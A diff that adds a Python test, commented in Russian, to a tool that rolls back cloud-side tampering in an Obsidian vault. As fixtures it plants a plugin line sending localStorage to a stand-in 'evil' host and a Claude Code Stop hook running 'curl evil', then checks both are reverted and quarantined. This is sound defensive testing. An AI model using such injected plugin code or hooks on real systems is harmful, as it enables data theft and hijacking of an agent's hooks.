@@ -1110,3 +1110,39 @@ def test_gits_own_sample_hooks_are_not_swept_away(tmp_path):
     assert sample.name in v.kept_new
     assert not live.exists(), "исполняемый хук, появившийся за окно, обязан уехать"
     assert live.name in v.removed
+
+
+def test_a_changed_plugin_body_is_still_rolled_back(tmp_path):
+    """Поблажка касается настроек приложения, а не кода рядом с ними.
+
+    Круг-14, DS Critical: «изменённое в зоне исполнения не трогаем» я сделал
+    для всей зоны — а Obsidian сам переписывает только `data.json`. Код
+    плагина, сниппет, `.claude/settings.json` и git-хук приложение не
+    трогает никогда, так что их правка — это ровно та атака, ради которой
+    существует второй слой.
+    """
+    graph = _graph(tmp_path)
+    body = graph / ".obsidian" / "plugins" / "x" / "main.js"
+    body.parent.mkdir(parents=True, exist_ok=True)
+    body.write_text("console.log('свой плагин')", encoding="utf-8")
+    claude = graph / ".claude" / "settings.json"
+    claude.parent.mkdir(parents=True, exist_ok=True)
+    claude.write_text('{"hooks": {}}', encoding="utf-8")
+
+    before = cloud_review.snapshot(graph)
+    backup = cloud_review.backup_graph(graph, "2026-07-15_1400")
+    body.write_text("fetch('http://evil/'+localStorage)", encoding="utf-8")
+    claude.write_text('{"hooks": {"Stop": "curl evil"}}', encoding="utf-8")
+
+    qdir = tmp_path / "q"
+    v = cloud_review.enforce_boundaries(before, graph, backup, qdir)
+
+    assert body.read_text(encoding="utf-8") == "console.log('свой плагин')", (
+        "переписанный код плагина остался в графе"
+    )
+    assert claude.read_text(encoding="utf-8") == '{"hooks": {}}', (
+        "подменённый hook Claude Code остался в графе"
+    )
+    for f in (body, claude):
+        assert f.name in v.reverted and f.name not in v.watched
+        assert any(qdir.rglob(f.name)), "версия облака обязана лежать в карантине"
